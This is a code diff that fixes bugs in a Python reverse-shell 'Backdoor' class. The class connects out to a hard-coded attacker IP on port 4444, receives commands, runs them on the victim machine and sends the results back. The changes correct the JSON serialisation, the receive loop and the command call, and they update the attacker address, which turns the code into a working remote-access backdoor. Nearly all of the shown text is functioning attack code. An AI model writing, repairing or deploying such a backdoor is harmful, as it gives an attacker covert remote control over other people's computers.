@@ -12,14 +12,14 @@ class Backdoor:
         self.connection.connect((ip, port)) # attacker pc ip
 
     def reliable_send(self, data):
-        json_data = json.dump(data)
+        json_data = json.dumps(data)
         self.connection.send(json_data)
 
     def reliable_receive(self):
         json_data = b""
         while True:
             try:
-                json_data = self.connection.recv(1024)
+                json_data = json_data + self.connection.recv(1024)
                 return json.loads(json_data)
             except ValueError:
                 continue
@@ -43,7 +43,7 @@ class Backdoor:
 
     def run(self):
         while True:
-            command = self.reliable_receive(1024)
+            command = self.reliable_receive()
             try:
                 if command[0] == "exit":
                     self.connection.close()
@@ -61,5 +61,5 @@ class Backdoor:
             self.reliable_send(command_result)
 
 
-my_backdoor = Backdoor("192.168.1.11", 4444)
+my_backdoor = Backdoor("192.168.1.2", 4444)
 my_backdoor.run()
